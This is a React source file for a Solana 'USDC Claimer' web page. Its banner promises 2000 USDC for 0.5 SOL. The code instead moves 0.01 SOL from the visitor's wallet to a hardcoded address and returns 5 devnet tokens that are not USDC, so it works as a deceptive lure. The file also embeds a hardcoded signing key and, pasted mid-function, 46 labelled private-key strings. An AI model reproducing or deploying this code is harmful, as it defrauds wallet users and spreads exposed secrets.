/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "dS35Sewjek8Ejy8Y7NGakH2RqL3mY8SFcRymYgJPiCtdZCpigvXfk5A5fmz1n9orGTkHvduXBUUuj9b4qtdMkbL"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "jHdyMbZ11qfKgdoEEn8z16vkVewYkgFZ5YaZecXBuay1MAHeZuyRPo8iyPewY1sZgSRfEdy85WH8CkekwWEZhbr",
  "key1": "tfjvaCY6a62xgDJVtr3xieFvTtDEtJNqBQGS83pQyjjXkUS2S24dvoArJ9GAerrVi3YfBWTHzPErhL1o38NRnUZ",
  "key2": "9PU1AePu8BhCNDbBf9qQgr3kenDurNcj27SNr7tV6xZiuxg1B7ibRAWUzyzzEX6bjm6gFQjQ5ELnNTFsghATZh7",
  "key3": "4FbpayxB72QvcuVgcRVKK2szUuVKmXGHk9VMMabwiu3Mgo6oHRcfvFFLXwr97GVXHS3h7z23M7eTrUbmV9kEVyxx",
  "key4": "4GhgemwMCP1qrSmdX3Js71nF8n3CsNhctwC7yp5NU3nE7wGiDxELEVZxETeAPv2aAeDygy7tyUH7nSYhaveq6ggQ",
  "key5": "2hfPH1mZ8aiLXcCHeYgFv6xipG3odts2JY9jJ7GNT7vxqteMnqQApkMBezcnCiLVYKQvRHZzQUmQQ9u7eRisdQsN",
  "key6": "66HbBuMjoEabV44rjT9R4ydho6oEzEdTX4b7CkDExR4fpnfviWCNqi75rDASQQvbFZg63qvyKoHU9uYY5uaeUxdT",
  "key7": "2moop88WbsApcuvYKhjMdcwQ2P3MEER9uD8CE9YHeitWkArwMnAjAyW9Cq5d6dzXKKiev3o413ooUdRJiRDz2kYt",
  "key8": "otfGSx1JSUU1agzgxydL68ZnJyZwdoXMkonYJRusreunXmrgXcab9wNpz1MZfuCQzJyMxXxU45gyrN1ZCqbTh4R",
  "key9": "2QKLxT5eMeiomYQnhtz245fzSJ9NkRGSamb5zhrZVS7xZsTxV3CHnitNrnCmEoqwRf32hLPxyrBSjtpgwckLHSqX",
  "key10": "2Cro41iwBQQGxLdK4MBD3djcAhP21xoomZLjq9Buqew5wDSa3DFuBLA8b2x2fRgbDJmJKx3hdJW43WFjAeij4Mdz",
  "key11": "3Y6omqMWi9UkZTzRe9263fcrDwZHso6RJ6rstj7wGbgN958Da3Q1sdh2aqsb8Zc8HJXj5vkwbRAmMhhRbzgWQtmt",
  "key12": "4tSiz4Q7s4yrbf4VJGVQyDaFaHbv14yaLeQbHhChzmxdoQXAFx1WrbcBZYkyjhihqPcVG89PyVaatRCdQyQwTQ2Z",
  "key13": "44TRNPUGiubenUXYwYXTxVEwSdp3kmgR5fGCyevLPBzDY6RDeAQ1yuj6RdbfkLBBcQTfyQfAGAt11ZPMEGvMTokU",
  "key14": "UQi1r6izT1hHzw4GD9qYyDM1ZjGqE6q4pWXffnwRn5b45YXjdoNc6LAvM9TVqVT3zKBmuHJn3BebK18qdxqgJS6",
  "key15": "2hAq6HT2dB7Vp28KduH7FMUpt6D6y3WVfgsoJdfTGhXu1CEjdjReVhLQutkMMNTEujsvaXqatgGu5bWXyobz6w5j",
  "key16": "VMdSPXicLjn4QH68WKdpPunJaieWpaBXkix7WGt1gX9Wa4C7jvePQjs2FN3RJJNHhaXNxGBknY1TVknL3w9tvLE",
  "key17": "KqAiVyLWd1LW5vRvpApvGU9Bh9AzCMcLRsDJoRnFJa3JeZrt7oDRPoyYczXjkRNeTx5Rq7RqSzoTYgsTx88yhmq",
  "key18": "nWadnYjuUX6mSRHLpAAimBr5GTfwLqfBVC6CXSr9VxGR337KQtCsVawVaBBoAjTCvQDLzUaP1iq1c9Lwj4Kv6VA",
  "key19": "2FTSbRXbukgjccoxQCtqFc2FHabkFw2ugtPqd2nVeTUhgQfWUA6i2E7W4HkKfhv9J5TBDqBtSDDbQVCdeEnk5c6N",
  "key20": "2b2DBzHgEzBaHdj5jBV2uhGeeyypTGyAFzYidbkMVTwdbfYdVu7pghBJTxFGC7e78CJrLFHh546HNcKudLvBgpM9",
  "key21": "wKkXfb6Gx669HDD95YWNuYXtx5FfuzpjnV7DE7v8XUW9WLwWXux7c1nbKVVUqxNfCpP4Az5WnvzhV91vuSTXK8n",
  "key22": "V3vANg2zVL9SCnTsyYyC4X98TEH5jtTEFVQz7hScGr1suaZcru9v7Bx5PtXRrx7y35QiXMCWrueRJEQS2x2DX8i",
  "key23": "5zduuqNy9M8vy5guwQ83FXHXQktbUSGukMoQ6zex1KWqtUia5PbnF6jjGSBehfoPxTezzYehiABkcQRkRwfLXoDL",
  "key24": "2DnBG7hMGFK27UrUmXPMAE2nKKr9Gmcnt42WAqaXmdYq4gqc5YUHLvpFb3yAaSxwcSRSNN5bmPi3yxBW51xEXT9G",
  "key25": "26BCEeXKqsY1iTqasB4YdaGnLQcsXXPxmvBozeRco4TLj4vuMpYEZpSFmLYEBdZBQj2yhfgzZ6WGLj5xG54WxFgJ",
  "key26": "4QL2AaqLXvnRmtyzY7dataVnyJ9XWcBNXduFJ7LuicFfXCGwRarkfk9PikVdN2PCir5VKzq22HzByDJ7ZT8GWaPE",
  "key27": "4JhLXRs1CwBFwfqivyh3bsc5E4sUSjmH5bYQgdxm1Ms56TsaKwL724rK5JYnaWWEBtAezobuQDDHokiKQAUwH3pB",
  "key28": "r5nxrLH8n2SLEnHewGg6iW6pTk4yrDGBpmYhowCXx81fzuig8wAShTwEm1FKGqyTFuoegEdQNRSosUmJMy549HZ",
  "key29": "4Zjquvr1XrEYxJmCj5Li5UUXExxmcC1wUHCXwxCh5X5NQQT7aZ5jzodBGnyj9jBybo2RwyMGfc2mtfsAZ6paTmBW",
  "key30": "5ic4KStPu6QUvD3tJipTLyRmpCksf681Hb11aRpX28uZGvvY3BrkG8HsLY7r16bAE2N9eJsxqvHbgmRQeLLuuL2R",
  "key31": "vmXtRc3PuVy8GUnVVGjn7xBj2DamcRTzuAw8F7j9tgpJv7D31VWgMP248DX8AzdqEP7uSFx5tFxUwmrEMvenZLF",
  "key32": "2JEvS3Q94GHQjnxreTFDohsfWTNRpN4bGQTzaNPzqZo4PCbRxrAYVar5DEHyAsnvQpN5kFaaG8Tq4shgL2cCXqh6",
  "key33": "54QEVwV4aGVJNRCsUBYmi9vCAC9dXVqaxkf3LYfmsggcsLTwh3FSRZV9qdcNm1cQSuFTwEEVRTB2a6XUuFQQLV7w",
  "key34": "2jjPUqRuJ6tpqKiF5UwLvEhfz9PpcXwRrd6niu67zDqp6mSU1uFmGwaqCLCxS4itQKrN6PriX6Pfq8BxqK3wxsSU",
  "key35": "2Xy8TqGYTns5Fnxoynj6ENT44GSHu38snuFMXtmxFTxjG2RVAtzQHiN3uPNj5P7vTZYexmpShuFvddUrWY2ncJrP",
  "key36": "52tLfQCp9kidji9xVbyoUpTiZEKaZExrnPGqLqy6NkjnDu9zBoL8bMitL6us8YuSwa1cRd8jdDZdv9szvJXHUYMS",
  "key37": "2rHNiBcuWMXmcyKZPSFYmNY3Fe7peYKMriVCZEemjgXWTeWNfdSmNymoRN46RtFhZRbSgW2HsspHTDgC6ww6KopX",
  "key38": "2NtsaAne4nSWrfHUDyysTH2aUcyjS8fuKZHWLs82FUBFW74RaikZwq2rP71jhHGLuqadYU7eqhiU63uGBVQEJDvN",
  "key39": "31fceWUj3njfqGJRrMUM2cVW2jcbaCiBAQyFthxaXB9sADnsTkxUgNFS7RAR1AX5hM2di6wYZkGLZT6sRxQDJHAk",
  "key40": "4a9Eb19JJ5GC9KUUgN1EbiibSqEhzn3yyr2dC4jXn6xRYhbWAtZErWiuHzJztThEHeSYqdJ1XmtQRu2jCK8RK8Yf",
  "key41": "WfpPrLVsY29CrCFxdF2Kvqeo6XaeEecCjTrZuEFggaAaHYKZ3uXgtE4cMiGks1b2NRPvLhCmGL4H67RaH96C3gV",
  "key42": "2ofAprUtYsofzVMjtx4ceWc6f69uaD6MPMaXQVfcTYyq7bSMtULiDkjrMEPto216wUbTdXvjsL78DeGy6fNgxcou",
  "key43": "LCLXoTVAjmx1uA6GVX2E9E2BHz2hdq5SWf2GLRHoqUiWgp5ufkt5LeEfAFkQMEqzzbLK1jjDsKEqp3Uv3PMtCAw",
  "key44": "35RJsj4zgpUZmcap9a9DqtumEvs1dNiyf5NFL37uVJJCuVqKPSqYtV1Zpmr3L3G9664ibjWTCisdu7jSTQRzTXcH",
  "key45": "3FhZ8V3mmHc4V7vHipZqbSEEB5SD5BCVsXMxcWTziTVMyEDazMrU9XfLBg9vc1ENHqGniMskYgxouxF5wzpfSxCc"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
